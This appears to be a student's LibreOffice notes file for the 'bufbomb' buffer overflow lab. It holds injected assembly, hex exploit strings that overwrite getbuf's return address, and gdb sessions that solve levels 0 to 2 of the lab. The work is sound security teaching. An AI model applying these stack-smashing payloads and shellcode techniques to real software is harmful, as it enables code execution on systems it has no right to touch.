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4a3d" officeooo:paragraph-rsid="00124a3d"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00152d38" officeooo:paragraph-rsid="00152d38"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00158fc7" officeooo:paragraph-rsid="00158fc7"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001386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urn address</text:p>
      <text:p text:style-name="P1">0x556833a0-0x28=0x5568337<text:span text:style-name="T1">8</text:span></text:p>
      <text:p text:style-name="P1">%ebp-0x28</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">mov $0x759069aa,0x804b1cc</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">push $0x080490dc</text:p>
      <text:p text:style-name="P1"></text:p>
      <text:p text:style-name="P1">ret</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">C7 05 CC B1 04 08 AA</text:p>
      <text:p text:style-name="P1">69 90 75</text:p>
      <text:p text:style-name="P1">68 DC 90 04 08</text:p>
      <text:p text:style-name="P1">C3</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">EE EE EE EE</text:p>
      <text:p text:style-name="P1">72 33 68 55</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">A1 AA 69 90 75</text:p>
      <text:p text:style-name="P2">A3 CC B1 04 08</text:p>
      <text:p text:style-name="P2">68 DC 90 04 08</text:p>
      <text:p text:style-name="P2">C3</text:p>
      <text:p text:style-name="P2">EE EE EE EE</text:p>
      <text:p text:style-name="P2">EE EE EE EE</text:p>
      <text:p text:style-name="P2">EE EE EE EE</text:p>
      <text:p text:style-name="P2">EE EE EE EE</text:p>
      <text:p text:style-name="P2">EE EE EE EE</text:p>
      <text:p text:style-name="P2">EE EE EE EE</text:p>
      <text:p text:style-name="P2">78 33 68 55</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gdb bufbomb</text:p>
      <text:p text:style-name="P3">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</text:p>
      <text:p text:style-name="P3">Copyright (C) 2014 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="P3">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="P3">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="P3">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="P3">and "show warranty" for details.</text:p>
      <text:p text:style-name="P3">This GDB was configured as "i686-linux-gnu".</text:p>
      <text:p text:style-name="P3">Type "show configuration" for configuration details.</text:p>
      <text:p text:style-name="P3">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="P3">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</text:p>
      <text:p text:style-name="P3">Find the GDB manual and other documentation resources online at:</text:p>
      <text:p text:style-name="P3">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/>For help, type "help".</text:p>
      <text:p text:style-name="P3">Type "apropos word" to search for commands related to "word"...</text:p>
      <text:p text:style-name="P3">Reading symbols from bufbomb...done.</text:p>
      <text:p text:style-name="P3">(gdb) b *0x804912f</text:p>
      <text:p text:style-name="P3">Breakpoint 1 at 0x804912f</text:p>
      <text:p text:style-name="P3">(gdb) r</text:p>
      <text:p text:style-name="P3">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb </text:p>
      <text:p text:style-name="P3">/home/chenzhongyu/Desktop/lab3/bufbomb: Missing required argument (-u &lt;userid)</text:p>
      <text:p text:style-name="P3">Usage: /home/chenzhongyu/Desktop/lab3/bufbomb -u &lt;userid&gt; [-nsh]</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-u &lt;userid&gt; User ID</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-n <text:s text:c="9"/>Nitro mode</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-s <text:s text:c="9"/>Submit your solution to the grading server</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-h <text:s text:c="9"/>Print help information</text:p>
      <text:p text:style-name="P3">[Inferior 1 (process 6421) exited normally]</text:p>
      <text:p text:style-name="P3">(gdb) ./bufbomb -u 16307130194 [-nsh]</text:p>
      <text:p text:style-name="P3">Undefined command: "". <text:s/>Try "help".</text:p>
      <text:p text:style-name="P3">(gdb) ./hex2raw &lt; level1 | ./bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Undefined command: "". <text:s/>Try "help".</text:p>
      <text:p text:style-name="P3">(gdb) q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Misfire: global_value = 0x0</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gdb bufbomb</text:p>
      <text:p text:style-name="P3">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</text:p>
      <text:p text:style-name="P3">Copyright (C) 2014 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="P3">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="P3">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="P3">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="P3">and "show warranty" for details.</text:p>
      <text:p text:style-name="P3">This GDB was configured as "i686-linux-gnu".</text:p>
      <text:p text:style-name="P3">Type "show configuration" for configuration details.</text:p>
      <text:p text:style-name="P3">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="P3">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</text:p>
      <text:p text:style-name="P3">Find the GDB manual and other documentation resources online at:</text:p>
      <text:p text:style-name="P3">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</text:p>
      <text:p text:style-name="P3">For help, type "help".</text:p>
      <text:p text:style-name="P3">Type "apropos word" to search for commands related to "word"...</text:p>
      <text:p text:style-name="P3">Reading symbols from bufbomb...done.</text:p>
      <text:p text:style-name="P3">(gdb) print (char *) 0x804b1cc</text:p>
      <text:p text:style-name="P3">$1 = 0x804b1cc &lt;global_value&gt; ""</text:p>
      <text:p text:style-name="P3">(gdb) print (char *) 0x804b1c4</text:p>
      <text:p text:style-name="P3">$2 = 0x804b1c4 &lt;cookie&gt; ""</text:p>
      <text:p text:style-name="P3">(gdb) r</text:p>
      <text:p text:style-name="P3">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb </text:p>
      <text:p text:style-name="P3">/home/chenzhongyu/Desktop/lab3/bufbomb: Missing required argument (-u &lt;userid)</text:p>
      <text:p text:style-name="P3">Usage: /home/chenzhongyu/Desktop/lab3/bufbomb -u &lt;userid&gt; [-nsh]</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-u &lt;userid&gt; User ID</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-n <text:s text:c="9"/>Nitro mode</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:s text:c="2"/>-s <text:s text:c="9"/>Submit your solution to the grading server</text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/>-h <text:s text:c="9"/>Print help information</text:p>
      <text:p text:style-name="P3">[Inferior 1 (process 7717) exited normally]</text:p>
      <text:p text:style-name="P3">(gdb) r -u 16307130194</text:p>
      <text:p text:style-name="P3">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:hhhhh</text:p>
      <text:p text:style-name="P3">Dud: getbuf returned 0x1</text:p>
      <text:p text:style-name="P3">Better luck next time</text:p>
      <text:p text:style-name="P3">[Inferior 1 (process 7728) exited normally]</text:p>
      <text:p text:style-name="P3">(gdb) r -u 16307130194</text:p>
      <text:p text:style-name="P3">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:j </text:p>
      <text:p text:style-name="P3">Dud: getbuf returned 0x1</text:p>
      <text:p text:style-name="P3">Better luck next time</text:p>
      <text:p text:style-name="P3">[Inferior 1 (process 7730) exited normally]</text:p>
      <text:p text:style-name="P3">(gdb) b getbuf</text:p>
      <text:p text:style-name="P3">Breakpoint 1 at 0x8048caa</text:p>
      <text:p text:style-name="P3">(gdb) r -u 16307130194</text:p>
      <text:p text:style-name="P3">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3"></text:p>
      <text:p text:style-name="P3">Breakpoint 1, 0x08048caa in getbuf ()</text:p>
      <text:p text:style-name="P3">(gdb) x $ebp</text:p>
      <text:p text:style-name="P3">0x556833a0 &lt;_reserved+1037216&gt;:<text:tab/>0x556833d0</text:p>
      <text:p text:style-name="P3">(gdb) print 0x556833a0-0x28</text:p>
      <text:p text:style-name="P3">$3 = 1432892280</text:p>
      <text:p text:style-name="P3">(gdb) q</text:p>
      <text:p text:style-name="P3">A debugging session is active.</text:p>
      <text:p text:style-name="P3"></text:p>
      <text:p text:style-name="P3"><text:tab/>Inferior 1 [process 7739] will be killed.</text:p>
      <text:p text:style-name="P3"></text:p>
      <text:p text:style-name="P3">Quit anyway? (y or n) y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<text:soft-page-break/>Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:Ouch!: You caused a segmentation fault!</text:p>
      <text:p text:style-name="P3">Better luck next time</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ /home</text:p>
      <text:p text:style-name="P3">bash: /home: Is a directory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print /x 0x556833a0-0x28</text:p>
      <text:p text:style-name="P3">Warning: unknown mime-type for "/x" -- using "application/octet-stream"</text:p>
      <text:p text:style-name="P3">Warning: unknown mime-type for "0x556833a0-0x28" -- using "application/octet-stream"</text:p>
      <text:p text:style-name="P3">Error: no such file "/x"</text:p>
      <text:p text:style-name="P3">Error: no such file "0x556833a0-0x28"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ls</text:p>
      <text:p text:style-name="P3">bufbomb <text:s text:c="5"/>bufbomb.txt~ <text:s/>hex2raw <text:s text:c="3"/>level0 <text:s text:c="2"/>level1 <text:s text:c="2"/>level2 <text:s text:c="2"/>makecookie <text:s/>source2.o <text:s/>source2.s~</text:p>
      <text:p text:style-name="P3">bufbomb.txt <text:s/>buflab.pdf <text:s text:c="3"/>lab3.pptx <text:s/>level0~ <text:s/>level1~ <text:s/>level2~ <text:s/>source2.d <text:s text:c="2"/>source2.s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gcc -m32 -c test.s</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ objdump -d test.o &gt; test.d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<text:soft-page-break/>Better luck next time</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; level0 | ./bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:Smoke!: You called smoke()</text:p>
      <text:p text:style-name="P3">VALID</text:p>
      <text:p text:style-name="P3">NICE JOB!</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; level1 | ./bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:Fizz!: You called fizz(0x759069aa)</text:p>
      <text:p text:style-name="P3">VALID</text:p>
      <text:p text:style-name="P3">NICE JOB!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Misfire: global_value = 0x0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<text:soft-page-break/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Misfire: global_value = 0x0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gcc -m32 -c test.s</text:p>
      <text:p text:style-name="P3">test.s: Assembler messages:</text:p>
      <text:p text:style-name="P3">test.s:3: Error: no such instruction: `jump $0x080490dc'</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c test.s</text:p>
      <text:p text:style-name="P3">test.s: Assembler messages:</text:p>
      <text:p text:style-name="P3">test.s:3: Error: no such instruction: `jump $0x080490dc'</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c test.s</text:p>
      <text:p text:style-name="P3">test.s: Assembler messages:</text:p>
      <text:p text:style-name="P3">test.s:3: Error: no such instruction: `jump 0x080490dc'</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c test.s</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ objdump -d test.o &gt; test.d</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ touch test.txt</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; TEST | ./bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">bash: TEST: No such file or directory</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:Dud: getbuf returned 0x1</text:p>
      <text:p text:style-name="P3">Better luck next time</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; test | ./bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">bash: test: No such file or directory</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/>Type string:Dud: getbuf returned 0x1</text:p>
      <text:p text:style-name="P3">Better luck next time</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ls</text:p>
      <text:p text:style-name="P3">bufbomb <text:s text:c="6"/>buflab.pdf <text:s/>level0 <text:s text:c="2"/>level1~ <text:s/>makecookie <text:s/>source2.o <text:s text:c="2"/>test.d <text:s/>test.s~</text:p>
      <text:p text:style-name="P3">bufbomb.txt <text:s text:c="2"/>hex2raw <text:s text:c="4"/>level0~ <text:s/>level2 <text:s text:c="2"/>source2.d <text:s text:c="2"/>source2.s <text:s text:c="2"/>test.o <text:s/>test.txt</text:p>
      <text:p text:style-name="P3">bufbomb.txt~ <text:s/>lab3.pptx <text:s text:c="2"/>level1 <text:s text:c="2"/>level2~ <text:s/>source2.d~ <text:s/>source2.s~ <text:s/>test.s <text:s/>test.txt~</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; test.txt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Ouch!: You caused a segmentation fault!</text:p>
      <text:p text:style-name="P3">Better luck next time</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ls</text:p>
      <text:p text:style-name="P3">bufbomb <text:s text:c="6"/>buflab.pdf <text:s/>level0 <text:s text:c="2"/>level1~ <text:s/>makecookie <text:s/>source2.o <text:s text:c="2"/>test.d <text:s/>test.s~</text:p>
      <text:p text:style-name="P3">bufbomb.txt <text:s text:c="2"/>hex2raw <text:s text:c="4"/>level0~ <text:s/>level2 <text:s text:c="2"/>source2.d <text:s text:c="2"/>source2.s <text:s text:c="2"/>test.o <text:s/>test.txt</text:p>
      <text:p text:style-name="P3">bufbomb.txt~ <text:s/>lab3.pptx <text:s text:c="2"/>level1 <text:s text:c="2"/>level2~ <text:s/>source2.d~ <text:s/>source2.s~ <text:s/>test.s <text:s/>test.txt~</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c level.s</text:p>
      <text:p text:style-name="P3">gcc: error: level.s: No such file or directory</text:p>
      <text:p text:style-name="P3">gcc: fatal error: no input files</text:p>
      <text:p text:style-name="P3">compilation terminated.</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c level2.s</text:p>
      <text:p text:style-name="P3">gcc: error: level2.s: No such file or directory</text:p>
      <text:p text:style-name="P3">gcc: fatal error: no input files</text:p>
      <text:p text:style-name="P3">compilation terminated.</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c source2.s</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ objdump -d source2.o &gt; source2.d</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; level2 | ./bufbomb -u 16307130194</text:p>
      <text:p text:style-name="P3">Userid: 16307130194</text:p>
      <text:p text:style-name="P3">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="P3">Type string:Bang!: You set global_value to 0x759069aa</text:p>
      <text:p text:style-name="P3">VALID</text:p>
      <text:p text:style-name="P3">NICE JOB!</text:p>
      <text:p text:style-name="P3">chenzhongyu@ubuntu:~/Desktop/lab3$ </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">kie: 0x759069aa</text:p>
      <text:p text:style-name="P3"></text:p>
      <text:p text:style-name="P3">Breakpoint 1, 0x08048caa in getbuf ()</text:p>
      <text:p text:style-name="P3">(gdb) disas</text:p>
      <text:p text:style-name="P3">Dump of assembler code for function getbuf:</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048ca4 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048ca5 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048ca7 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x38,%esp</text:p>
      <text:p text:style-name="P3">=&gt; 0x08048caa &lt;+6&gt;:<text:tab/>lea <text:s text:c="3"/>-0x28(%ebp),%eax</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:s text:c="3"/>0x08048cad &lt;+9&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cb0 &lt;+12&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cb5 &lt;+17&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cba &lt;+22&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cbb &lt;+23&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P3">End of assembler dump.</text:p>
      <text:p text:style-name="P3">(gdb) x $ebp</text:p>
      <text:p text:style-name="P3">0x556833a0 &lt;_reserved+1037216&gt;:<text:tab/>0x556833d0</text:p>
      <text:p text:style-name="P3">(gdb) print $ebp-0x28</text:p>
      <text:p text:style-name="P3">$1 = (void *) 0x55683378 &lt;_reserved+1037176&gt;</text:p>
      <text:p text:style-name="P3">(gdb) x %eax</text:p>
      <text:p text:style-name="P3">A syntax error in expression, near `%eax'.</text:p>
      <text:p text:style-name="P3">(gdb) x $eax</text:p>
      <text:p text:style-name="P3">0x1991ffd3:<text:tab/>Cannot access memory at address 0x1991ffd3</text:p>
      <text:p text:style-name="P3">(gdb) nexti</text:p>
      <text:p text:style-name="P3">0x08048cad in getbuf ()</text:p>
      <text:p text:style-name="P3">(gdb) disas</text:p>
      <text:p text:style-name="P3">Dump of assembler code for function getbuf:</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048ca4 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048ca5 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048ca7 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x38,%esp</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048caa &lt;+6&gt;:<text:tab/>lea <text:s text:c="3"/>-0x28(%ebp),%eax</text:p>
      <text:p text:style-name="P3">=&gt; 0x08048cad &lt;+9&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cb0 &lt;+12&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cb5 &lt;+17&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cba &lt;+22&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0x08048cbb &lt;+23&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P3">End of assembler dump.</text:p>
      <text:p text:style-name="P3">(gdb) x $eax</text:p>
      <text:p text:style-name="P3">0x55683378 &lt;_reserved+1037176&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="P3">(gdb)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7:57:30.679130622</meta:creation-date>
    <dc:date>2017-11-01T21:31:28.820647652</dc:date>
    <meta:editing-duration>PT3H18M27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8" meta:paragraph-count="367" meta:word-count="1639" meta:character-count="13524" meta:non-whitespace-character-count="11602"/>
  </office:meta>
</office:document-meta>
</file>